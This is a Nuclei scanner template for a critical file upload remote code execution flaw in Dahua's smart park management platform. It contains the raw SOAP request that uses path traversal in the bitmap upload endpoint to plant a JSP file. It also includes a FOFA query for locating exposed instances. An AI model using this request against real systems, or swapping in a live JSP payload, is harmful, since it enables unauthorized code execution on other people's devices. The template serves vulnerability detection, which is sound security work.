nuclei-v3/D/dahua-bitmap-fileupload.yaml

flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - <soap:Envelope
  raw:
  - "POST /emap/webservice/gis/soap/bitmap HTTP/1.1\nHostname: {{Hostname}}\nContent-Type:\
    \ \"text/xml; charset=utf-8\"\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \ xmlns:res=\"http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\">\n\
    \    <soapenv:Header/>\n        <soapenv:Body>\n                <res:uploadPicFile>\n\
    \                    <arg0>\n                    <picPath>/../{{rand_str}}.jsp</picPath>\n\
    \                    </arg0>\n                    <arg1>{{cmd}}</arg1>\n     \
    \           </res:uploadPicFile>\n        </soapenv:Body>\n</soapenv:Envelope>\n"
- matchers:
  - type: word
    words:
    - '{{base64_decode(cmd)}}'
  raw:
  - 'GET /upload/{{rand_str}}.jsp HTTP/1.1

    Hostname: {{Hostname}}

    '
id: dahua-bitmap-fileupload
info:
  author: DhiyaneshDK
  metadata:
    fofa-query: "app=\"dahua-\u667A\u6167\u56ED\u533A\u7EFC\u5408\u7BA1\u7406\u5E73\
      \u53F0\""
    max-request: 1
    verified: true
  name: Dahua Bitmap - File Upload Remote Code Execution
  reference:
  - https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0bitmap%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  severity: critical
  tags: dahua,file-upload,rce,intrusive
variables:
  cmd: '{{base64(to_lower(rand_text_alpha(6)))}}'
  rand_str: '{{randstr}}'
